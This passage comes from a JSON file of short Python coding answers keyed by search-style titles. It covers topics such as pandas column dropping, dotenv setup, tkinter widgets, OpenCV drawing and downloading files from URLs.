    "description": "print(\"hi c:\")\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 966,
    "keyword": null,
    "link": null,
    "title": " dollar",
    "description": "print(\"Go Study\")\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 967,
    "keyword": null,
    "link": null,
    "title": " dotenv python",
    "description": "# Install dotenv via: pip3 install python-dotenv  # Load .env file using: from dotenv import load_dotenv load_dotenv()  # Use the variable with: import os os.getenv(\"ACCESS_KEY\") \npip install python-dotenv\n $ npm install dotenv  //--------------------  on file .env  //-------------------- DB_HOST=localhost DB_USER=root DB_PASS=s1mpl3 DB_NAME=banco_de_dados DB_PORT=3306 //--------------------  import the config from .env file  //--------------------  require('dotenv').config() module.exports = {     username:process.env.DB_USER,     password:process.env.DB_PASS,     database:process.env.DB_NAME,     host:process.env.DB_HOST,     dialect:\"mysql\" } \npip install -U python-dotenv  #### And in your script from dotenv import load_dotenv, find_dotenv load_dotenv(find_dotenv())\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 968,
    "keyword": null,
    "link": null,
    "title": " double slash python",
    "description": "# \"//\" is unconditionally \"flooring division\", e.g:  >>>4.0//1.5 2.0\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 969,
    "keyword": null,
    "link": null,
    "title": " downgrade python 3.8 to 3.7 ubuntu",
    "description": "sudo add-apt-repository ppa:deadsnakes/ppa sudo apt-get update sudo apt-get install python3.7 \n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 970,
    "keyword": null,
    "link": null,
    "title": " download all games chess.com",
    "description": "import urllib import urllib.request import json import datetime  def download_games(username: str, filename: str):     baseUrl = \"https://api.chess.com/pub/player/\" + username + \"/games/\"      with urllib.request.urlopen(baseUrl + \"archives\") as f:         archives = f.read()      try:         json_file = json.loads(archives)     except json.decoder.JSONDecodeError as e:         return False      for url in json_file['archives']:         date = datetime.datetime.strptime(url[-7:], '%Y/%m')          filepath = filename.format(date=date, username=username)          urllib.request.urlretrieve(url + '/pgn', filepath)  if __name__ == '__main__':     username = \"magnuscarlsen\"     filename = \"./{username}_games/chess_{date:%Y}-{date:%m}.pgn\"      download_games(username, filename)\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 971,
    "keyword": null,
    "link": null,
    "title": " download from radio javan python",
    "description": "def get_download_link(link): \t \t# Get media type     media_type = re.split(r\"/\", link)[3]          # Get File name     file_name = re.split(r\"/\", link)[5] \t     # Start session     session = requests.Session() \t     # get Response     response = session.get(f\"https://www.radiojavan.com/{media_type}/{media_type[:-1]}_host/?id={file_name}\")     base_url = str(json.loads(response.text)[\"host\"])  \t# Check media data type     # podcasts     if media_type == \"podcasts\":         return f\"{base_url}/media/podcast/mp3-256/{file_name}.mp3\"  \t# mp3s     elif media_type == \"mp3s\":         return f\"{base_url}/media/mp3/{file_name}.mp3\"  \t# videos     elif media_type == \"videos\":         return f\"{base_url}/media/music_video/hq/{file_name}.mp4\"        else:         return None          ########## Test ###########  get_download_link('https://www.radiojavan.com/mp3s/mp3/Shadmehr-Aghili-Avaz-Nemishi')            # Output :  # https://host2.rj-mw1.com/media/mp3/Shadmehr-Aghili-Avaz-Nemishi.mp3           \n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 972,
    "keyword": null,
    "link": null,
    "title": " download image python",
    "description": "import urllib.request  image_url = 'https://bit.ly/2XuVzB4' #the image on the web save_name = 'my_image.jpg' #local name to be saved urllib.request.urlretrieve(image_url, save_name)\nimport urllib.request imgURL = \"http://site.meishij.net/r/58/25/3568808/a3568808_142682562777944.jpg\"  urllib.request.urlretrieve(imgURL, \"D:/abc/image/local-filename.jpg\") \nimport requests with open('00000001.jpg','wb') as f: \tf.write(requests.get('http://www.gunnerkrigg.com//comics/00000001.jpg').content) \n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 973,
    "keyword": null,
    "link": null,
    "title": " download pdf from link using python",
    "description": "import urllib.request pdf_path = \"\" def download_file(download_url, filename):     response = urllib.request.urlopen(download_url)         file = open(filename + \".pdf\", 'wb')     file.write(response.read())     file.close()   download_file(pdf_path, \"Test\")\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 974,
    "keyword": null,
    "link": null,
    "title": " download pdf from url python",
    "description": "import urllib.request pdf_path = \"\" def download_file(download_url, filename):     response = urllib.request.urlopen(download_url)         file = open(filename + \".pdf\", 'wb')     file.write(response.read())     file.close()   download_file(pdf_path, \"Test\")\nimport requests url='https://pdfs.semanticscholar.org/c029/baf196f33050ceea9ecbf90f054fd5654277.pdf' r = requests.get(url, stream=True)  with open('myfile.pdf', 'wb') as f: f.write(r.content)\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 975,
    "keyword": null,
    "link": null,
    "title": " download pip install",
    "description": "python -m pip install --upgrade pip\npy -m pip download [options] <requirement specifier> [package-index-options] ... py -m pip download [options] -r <requirements file> [package-index-options] ... py -m pip download [options] <vcs project url> ... py -m pip download [options] <local project path> ... py -m pip download [options] <archive url/path> ... \n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 976,
    "keyword": null,
    "link": null,
    "title": " download python on wsl",
    "description": "sudo apt install python3 python3-pip ipython3\nwget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz\n",
    "reg_date": "2021-10-12T11:29:09.000Z"
  },
  {
    "id": 977,
    "keyword": null,
    "link": null,
    "title": " download youtube video in python",
    "description": "import YouTube from pytube  yt = YouTube(url) t = yt.streams.filter(only_audio=True) t[0].download(/path)\nfrom __future__ import unicode_literals import youtube_dl  ydl_opts = {} with youtube_dl.YoutubeDL(ydl_opts) as ydl:     ydl.download(['VideoURL'])\n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 978,
    "keyword": null,
    "link": null,
    "title": " draw a single pixel using pygame",
    "description": "surface.set_at((x, y), color)\n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 979,
    "keyword": null,
    "link": null,
    "title": " draw bounding box on image python cv2",
    "description": "# cv2.rectangle(img, pt1, pt2, color, thickness, lineType, shift) cv2.rectangle(img, (x1, y1), (x2, y2), (255,0,0), 2)  \"\"\" x1,y1 ------ |          | |          | |          | --------x2,y2 \"\"\"\n## drawing b.box for given coutour   contours, _ = cv2.findContours(thresh, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE) for c in contours:     rect = cv2.boundingRect(c)     if rect[2] < 100 or rect[3] < 100: continue     print cv2.contourArea(c)     x,y,w,h = rect     cv2.rectangle(im,(x,y),(x+w,y+h),(0,255,0),2)     cv2.putText(im,'Moth Detected',(x+w+10,y+h),0,0.3,(0,255,0)) cv2.imshow(\"Show\",im) cv2.waitKey()   cv2.destroyAllWindows() \n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 980,
    "keyword": null,
    "link": null,
    "title": " draw line from 2 mouse event in image python",
    "description": "import cv2  class DrawLineWidget(object):     def __init__(self):         self.original_image = cv2.imread('1.jpg')         self.clone = self.original_image.copy()          cv2.namedWindow('image')         cv2.setMouseCallback('image', self.extract_coordinates)          # List to store start/end points         self.image_coordinates = []      def extract_coordinates(self, event, x, y, flags, parameters):         # Record starting (x,y) coordinates on left mouse button click         if event == cv2.EVENT_LBUTTONDOWN:             self.image_coordinates = [(x,y)]          # Record ending (x,y) coordintes on left mouse bottom release         elif event == cv2.EVENT_LBUTTONUP:             self.image_coordinates.append((x,y))             print('Starting: {}, Ending: {}'.format(self.image_coordinates[0], self.image_coordinates[1]))              # Draw line             cv2.line(self.clone, self.image_coordinates[0], self.image_coordinates[1], (36,255,12), 2)             cv2.imshow(\"image\", self.clone)           # Clear drawing boxes on right mouse button click         elif event == cv2.EVENT_RBUTTONDOWN:             self.clone = self.original_image.copy()      def show_image(self):         return self.clone  if __name__ == '__main__':     draw_line_widget = DrawLineWidget()     while True:         cv2.imshow('image', draw_line_widget.show_image())         key = cv2.waitKey(1)          # Close program with keyboard 'q'         if key == ord('q'):             cv2.destroyAllWindows()             exit(1) \n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 981,
    "keyword": null,
    "link": null,
    "title": " draw line tkinter",
    "description": "#Drawing basic line on the canvas   from tkinter import *   from tkinter import ttk   app=Tk()   #App Title   app.title(\"Python GUI Application \")   #Lable   name=ttk.Label(app, text=\"Draw basic line\")   name.pack()   #Canvas   canvas=Canvas(app)   canvas.pack()   canvas.config(width=480,height=360)   #Canvas values   line=canvas.create_line(60,160,280,90,fill='blue',width=5)   #Calling Main()   app.mainloop()  \ncanvas.create_rectangle(30, 10, 120, 80,     outline=\"#fb0\", fill=\"#fb0\") \nfrom Tkinter import * master = Tk()  w = Canvas(master, width=250, height=200) w.create_rectangle(0, 0, 100, 100, fill=\"blue\", outline = 'blue') w.create_rectangle(50, 50, 100, 100, fill=\"red\", outline = 'blue')  w.pack() master.mainloop()\n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 982,
    "keyword": null,
    "link": null,
    "title": " draw spiral in matplotlib",
    "description": "import numpy as np  import matplotlib.pyplot as plt  import matplotlib.cm as cm   n = 256 angle = np.linspace(0,12*2*np.pi, n) radius = np.linspace(.5,1.,n)  x = radius * np.cos(angle) y = radius * np.sin(angle)  plt.scatter(x,y,c = angle, cmap = cm.hsv) plt.show()  // Matplotlib CB\n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 983,
    "keyword": null,
    "link": null,
    "title": " droaw heat map in python for null values",
    "description": "sns.heatmap(df.isnull(), cbar=False) \n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 984,
    "keyword": null,
    "link": null,
    "title": " drop a column from dataframe",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \ndf = df.drop('column_name', 1)\n#working with \"text\" syntax for the columns: df.drop(['column_nameA', 'column_nameB'], axis=1, inplace=True)\n#to drop by column number instead of by column label, try this to delete, e.g. the 1st, 2nd and 4th columns df = df.drop(df.columns[[0, 1, 3]], axis=1)  # df.columns is zero-based pd.Index \n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 985,
    "keyword": null,
    "link": null,
    "title": " drop a column in pandas",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndf = df[df['EPS'].notna()]\nnote: df is your dataframe  df = df.drop('coloum_name',axis=1)\ndf = df.drop(df.columns[[0, 1, 3]], axis=1)  # df.columns is zero-based pd.Index \n",
    "reg_date": "2021-10-12T11:29:10.000Z"
  },
  {
    "id": 986,
    "keyword": null,
    "link": null,
    "title": " drop a column pandas",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndf.drop(columns=['B', 'C'])\n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \n# axis=1 tells Python that we want to apply function on columns instead of rows # To delete the column permanently from original dataframe df, we can use the option inplace=True df.drop(['A', 'B', 'C'], axis=1, inplace=True)\n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 987,
    "keyword": null,
    "link": null,
    "title": " drop a range of rows pandas",
    "description": "#To delete rows 12 to 22 from the dataframe  df.drop(range(12,23), inplace=True)\n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 988,
    "keyword": null,
    "link": null,
    "title": " drop columnd python",
    "description": "cols = [1,2,4,5,12] df.drop(df.columns[cols],axis=1,inplace=True) \n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \ndf = df.drop(df.columns[[0, 1, 3]], axis=1)  # df.columns is zero-based pd.Index \n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 989,
    "keyword": null,
    "link": null,
    "title": " drop columns pandas",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndf.drop(columns=['B', 'C'])\ndf.drop('column_name', axis=1, inplace=True)\n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 990,
    "keyword": null,
    "link": null,
    "title": " drop duplicate rows pandas except nan",
    "description": "df[(~df.duplicated()) | (df['col'].isnull())] \n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 991,
    "keyword": null,
    "link": null,
    "title": " drop duplicates pandas first column",
    "description": "import pandas as pd     # making data frame from csv file  data = pd.read_csv(\"employees.csv\")     # sorting by first name  data.sort_values(\"First Name\", inplace = True)     # dropping ALL duplicte values  data.drop_duplicates(subset =\"First Name\",keep = False, inplace = True)     # displaying data  print(data)\n# Return a new DataFrame with duplicate rows removed  from pyspark.sql import Row df = sc.parallelize([   Row(name='Alice', age=5, height=80),   Row(name='Alice', age=5, height=80),   Row(name='Alice', age=10, height=80)]).toDF() df.dropDuplicates().show() # +---+------+-----+ # |age|height| name| # +---+------+-----+ # |  5|    80|Alice| # | 10|    80|Alice| # +---+------+-----+  df.dropDuplicates(['name', 'height']).show() # +---+------+-----+ # |age|height| name| # +---+------+-----+ # |  5|    80|Alice| # +---+------+-----+\n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 992,
    "keyword": null,
    "link": null,
    "title": " drop every other column pandas",
    "description": "#We would like to drop every other column data = data.loc[:, np.arange(len(data.columns)) %2 == 0]\n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 993,
    "keyword": null,
    "link": null,
    "title": " drop if nan in column pandas",
    "description": "df = df[df['EPS'].notna()]\nIn [30]: df.dropna(subset=[1])   #Drop only if NaN in specific column (as asked in the question) Out[30]:           0         1         2 1  2.677677 -1.466923 -0.750366 2       NaN  0.798002 -0.906038 3  0.672201  0.964789       NaN 5 -1.250970  0.030561 -2.678622 6       NaN  1.036043       NaN 7  0.049896 -0.308003  0.823295 9 -0.310130  0.078891       NaN \n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 994,
    "keyword": null,
    "link": null,
    "title": " drop last row pandas",
    "description": "df.drop(df.tail(n).index,inplace=True) # drop last n rows\n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 995,
    "keyword": null,
    "link": null,
    "title": " drop multiple columns in python",
    "description": "yourdf.drop(['columnheading1', 'columnheading2'], axis=1, inplace=True)\ndataframe.drop(['columnname1', 'columnname2'], axis=1, inplace=True) \n",
    "reg_date": "2021-10-12T11:29:11.000Z"
  },
  {
    "id": 996,
    "keyword": null,
    "link": null,
    "title": " drop multiple columns pandas",
    "description": "yourdf.drop(['columnheading1', 'columnheading2'], axis=1, inplace=True)\n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndataframe.drop(['columnname1', 'columnname2'], axis=1, inplace=True) \nnote: df is your dataframe  df = df.drop('coloum_name',axis=1)\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 997,
    "keyword": null,
    "link": null,
    "title": " drop none from list python",
    "description": ">>> L = [0, 23, 234, 89, None, 0, 35, 9] >>> [x for x in L if x is not None] [0, 23, 234, 89, 0, 35, 9]\n# using filter() # to remove None values in list res = list(filter(None, test_list))\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 998,
    "keyword": null,
    "link": null,
    "title": " drop null rows pandas",
    "description": "df.dropna() \ndf = df[df['EPS'].notna()] \ndf.dropna(subset=['name', 'born'])\n# It will erase every row (axis=0) that has \"any\" Null value in it. df = df.dropna(how='any',axis=0) \n>>> df.dropna(axis='columns')        name 0    Alfred 1    Batman 2  Catwoman \n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 999,
    "keyword": null,
    "link": null,
    "title": " drop the last row of a dataframe",
    "description": "df.drop(df.tail(n).index,inplace=True) # drop last n rows\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1000,
    "keyword": null,
    "link": null,
    "title": " drop unamed columns in pandas",
    "description": "df = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \ndf.to_csv(path, index=False)\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1001,
    "keyword": null,
    "link": null,
    "title": " dropdown in tkinter",
    "description": "from Tkinter import *  master = Tk()  variable = StringVar(master) variable.set(\"one\") # default value  w = OptionMenu(master, variable, \"one\", \"two\", \"three\") w.pack()  mainloop() \nfrom tkinter import * from tkinter import ttk  screen = Tk()  my_weekdays_names = [\"MONDAY\",\"TUESDAY\",\"WENSDAY\",\"THURSDAY\",\"FRIDAY\",\"SATURDAY\",\"SUNDAY\"]  def weekdaySelection(event):    for x in range(7):       if weekdaysDropdown.get() == my_weekdays_names[x]:          print(my_weekdays_names[x])                       weekdaysDropdown = ttk.Combobox(screen, values = my_weekdays_names) weekdaysDropdown.current(1) weekdaysDropdown.bind(\"<<ComboboxSelected>>\", weekdaySelection) weekdaysDropdown.grid()\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1002,
    "keyword": null,
    "link": null,
    "title": " dropna for specific column pandas",
    "description": "df.dropna() \ndf = df[df['EPS'].notna()] #instead of dropping, take another DF with non-na values\ndf.dropna(subset = ['column1', 'column2'], inplace = True)\nfish_frame = fish_frame.dropna(axis = 1, how = 'all')\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1003,
    "keyword": null,
    "link": null,
    "title": " dropping unnamed columns in pandas",
    "description": "df = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38\ndf = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \ndf.to_csv(path, index=False)\ndf2.columns.str.match(\"Unnamed\") df2.loc[:,~df2.columns.str.match(\"Unnamed\")]\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1004,
    "keyword": null,
    "link": null,
    "title": " dump json in file python",
    "description": "import json with open('data.json', 'w') as f:     json.dump(data, f)\nwith open('data.txt', 'w') as f:     json.dump(jsonData, f)\n# Python program to read  # json file        import json     # Opening JSON file  f = open('data.json',)     # returns JSON object as   # a dictionary  data = json.load(f)     # Iterating through the json  # list  for i in data['emp_details']:      print(i)     # Closing file  f.close()  \n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1005,
    "keyword": null,
    "link": null,
    "title": " each line in a text file into a list in Python",
    "description": "with open('file1.txt','r') as f: \tlistl=[] \tfor line in f: \t\tstrip_lines=line.strip() \t\tlistli=strip_lines.split() \t\tprint(listli) \t\tm=listl.append(listli) \tprint(listl)\n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1006,
    "keyword": null,
    "link": null,
    "title": " early stopping tensorflow",
    "description": "import tensorflow as tf  tf.keras.callbacks.EarlyStopping(     monitor='val_loss', min_delta=0, patience=0, verbose=0,     mode='auto', baseline=None, restore_best_weights=False ) \n",
    "reg_date": "2021-10-12T11:29:12.000Z"
  },
  {
    "id": 1007,
    "keyword": null,
    "link": null,
    "title": " edge detection opencv python",
    "description": "import cv2 img = cv2.imread(IMG_PATH) #reading the image edges = cv2.Canny(img,100,200) #canney edhe detecton cv2.imshow('Edges in the image', edges) #displaying the image\n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1008,
    "keyword": null,
    "link": null,
    "title": " edge tracking by hysteresis python",
    "description": "bottom_to_top = image.copy()   for row in range(image_row - 1, 0, -1):     for col in range(image_col - 1, 0, -1):         if bottom_to_top[row, col] == weak:             if bottom_to_top[row, col + 1] == 255 or bottom_to_top[row, col - 1] == 255 or bottom_to_top[row - 1, col] == 255 or bottom_to_top[                 row + 1, col] == 255 or bottom_to_top[                 row - 1, col - 1] == 255 or bottom_to_top[row + 1, col - 1] == 255 or bottom_to_top[row - 1, col + 1] == 255 or bottom_to_top[                 row + 1, col + 1] == 255:                 bottom_to_top[row, col] = 255             else:                 bottom_to_top[row, col] = 0   right_to_left = image.copy()   for row in range(1, image_row):     for col in range(image_col - 1, 0, -1):         if right_to_left[row, col] == weak:             if right_to_left[row, col + 1] == 255 or right_to_left[row, col - 1] == 255 or right_to_left[row - 1, col] == 255 or right_to_left[                 row + 1, col] == 255 or right_to_left[                 row - 1, col - 1] == 255 or right_to_left[row + 1, col - 1] == 255 or right_to_left[row - 1, col + 1] == 255 or right_to_left[                 row + 1, col + 1] == 255:                 right_to_left[row, col] = 255             else:                 right_to_left[row, col] = 0   left_to_right = image.copy()   for row in range(image_row - 1, 0, -1):     for col in range(1, image_col):         if left_to_right[row, col] == weak:             if left_to_right[row, col + 1] == 255 or left_to_right[row, col - 1] == 255 or left_to_right[row - 1, col] == 255 or left_to_right[                 row + 1, col] == 255 or left_to_right[                 row - 1, col - 1] == 255 or left_to_right[row + 1, col - 1] == 255 or left_to_right[row - 1, col + 1] == 255 or left_to_right[                 row + 1, col + 1] == 255:                 left_to_right[row, col] = 255             else:                 left_to_right[row, col] = 0 \n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1009,
    "keyword": null,
    "link": null,
    "title": " edit json file python",
    "description": "import json  with open('data.json', 'r+') as f:     data = json.load(f)     data['id'] = 134 # <--- add `id` value.     f.seek(0)        # <--- should reset file position to the beginning.     json.dump(data, f, indent=4)     f.truncate()     # remove remaining part \na_dictionary = {\"d\": 4}  with open(\"sample_file.json\", \"r+\") as file:     data = json.load(file)\t# get data from file     update(a_dictionary)     seek(0)     json.dump(data, file)\t# insert data in file\n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1010,
    "keyword": null,
    "link": null,
    "title": " edit line if str end with pandas",
    "description": "df.loc[df.stime.str.endswith('+2'), 'edate'] = pts['sdate']+1\n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1011,
    "keyword": null,
    "link": null,
    "title": " eigenvectors python",
    "description": "In [1]: import numpy as np  In [2]: K=np.random.normal(size=(2,2))  In [3]: eigenvalues, eigenvectors = np.linalg.eig(K)  In [4]: eigenvectors Out[4]:  array([[ 0.83022467+0.j        ,  0.83022467+0.j        ],        [ 0.09133956+0.54989461j,  0.09133956-0.54989461j]])  In [5]: eigenvectors.shape Out[5]: (2, 2) \n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1012,
    "keyword": null,
    "link": null,
    "title": " emacs region indent python",
    "description": "M-x python-shift-right (C-c >) M-x python-shift-left  (C-c <) \n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1013,
    "keyword": null,
    "link": null,
    "title": " empty dataframe",
    "description": "# Basic syntax: import pandas as pd empty_dataframe = pd.DataFrame()  # Create empty dataframe with column names empty_dataframe = pd.DataFrame(columns=['your', 'column', 'names'])  # Create empty dataframe with row names empty_dataframe = pd.DataFrame(index=['your', 'row', 'names'])\nnewDF = pd.DataFrame() #creates a new dataframe that's empty newDF = newDF.append(oldDF, ignore_index = True) # ignoring index is optional # try printing some data from newDF print newDF.head() #again optional \ndf = pd.DataFrame(columns=['a', 'b', 'c'])\n>>> df_empty = pd.DataFrame({'A' : []}) >>> df_empty Empty DataFrame Columns: [A] Index: [] >>> df_empty.empty True \n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1014,
    "keyword": null,
    "link": null,
    "title": " empty directory if not empty python",
    "description": "import shutil  shutil.rmtree('/folder_name') shutil.rmtree('/folder_name', ignore_errors=True)  # for read only files\n'''     Check if a Directory is empty : Method 1 '''     if len(os.listdir('/home/varun/temp') ) == 0:     print(\"Directory is empty\") else:         print(\"Directory is not empty\")\n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1015,
    "keyword": null,
    "link": null,
    "title": " encode labels in scikit learn",
    "description": "from sklearn import preprocessing le = preprocessing.LabelEncoder() y_numeric_label = le.fit_transform(y_text_label) y_numeric_label\n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1016,
    "keyword": null,
    "link": null,
    "title": " end keyword print python",
    "description": "# This Python program must be run with # Python 3 as it won't work with 2.7.    # by default, each string in print() will end in a new line # you can change this as below # ends the output with a <space>  print(\"Welcome to\" , end = ' ')  print(\"GeeksforGeeks\", end = ' ')  #Output: Welcome to GeeksforGeeks  # without the \"end\" keyword: print(\"Welcome to\") print(\"GeeksforGeeks\")  #Output: Welcome to  GeeksforGeeks\nprint('Checking file integrity...', end='') # (...) print('ok') \n",
    "reg_date": "2021-10-12T11:29:13.000Z"
  },
  {
    "id": 1017,
    "keyword": null,
    "link": null,
    "title": " end python in command",
    "description": "exit()\n",
    "reg_date": "2021-10-12T11:29:14.000Z"
  },
  {
    "id": 1018,
    "keyword": null,
    "link": null,
    "title": " endswith python",
    "description": "str.endswith(suffix[, start[, end]])  text = \"Python is easy to learn.\" result = text.endswith('to learn') # False result = text.endswith('to learn.')# True \n#!/usr/bin/python  str = \"this is string example....wow!!!\";  suffix = \"wow!!!\"; print str.endswith(suffix) print str.endswith(suffix,20)  suffix = \"is\"; print str.endswith(suffix, 2, 4) print str.endswith(suffix, 2, 6)\n",
    "reg_date": "2021-10-12T11:29:14.000Z"
  },
  {
    "id": 1019,
    "keyword": null,
    "link": null,
    "title": " enter key press bind tkinter",
    "description": "entry.bind('<Return>', func)\n",
    "reg_date": "2021-10-12T11:29:14.000Z"
  },
  {
    "id": 1020,
    "keyword": null,
    "link": null,
    "title": " enumerate in python",
    "description": "languages = ['Python', 'C', 'C++', 'C#', 'Java']  #Bad way i = 0 #counter variable for language in languages:     print(i, language)     i+=1  #Good Way for i, language in enumerate(languages):     print(i, language) \n>>> for count, value in enumerate(values): ...     print(count, value) ... 0 a 1 b 2 c \nlist1 = ['1', '2', '3', '4']  for index, listElement in enumerate(list1):      #What enumerate does is, it gives you the index as well as the element in an iterable     print(f'{listElement} is at index {index}') # This print statement is just for example output  # This code will give output :  \"\"\" 1 is at index 0 2 is at index 1 3 is at index 2 4 is at index 3 \"\"\"\n>>> def my_enumerate(sequence, start=0): ...     n = start ...     for elem in sequence: ...         yield n, elem ...         n += 1 ... \ngrocery = ['bread', 'milk', 'butter']  for item in enumerate(grocery):   print(item)  print('\\n') for count, item in enumerate(grocery):   print(count, item)  print('\\n') # changing default start value for count, item in enumerate(grocery, 100):   print(count, item)\nenumerate(iterable, start=0)  Parameters: Iterable: any object that supports iteration Start: the index value from which the counter is                to be started, by default it is 0\nReturn type: < type 'enumerate' > [(0, 'eat'), (1, 'sleep'), (2, 'repeat')] [(2, 'g'), (3, 'e'), (4, 'e'), (5, 'k')]\n",
    "reg_date": "2021-10-12T11:29:14.000Z"
  },
  {
    "id": 1021,
    "keyword": null,
    "link": null,
    "title": " enumerate zip python",
    "description": "alist = ['a1', 'a2', 'a3'] blist = ['b1', 'b2', 'b3']  for i, (a, b) in enumerate(zip(alist, blist)):     print i, a, b \n",
    "reg_date": "2021-10-12T11:29:14.000Z"
  },
  {
    "id": 1022,
    "keyword": null,
    "link": null,
    "title": " epoch to datetime python",
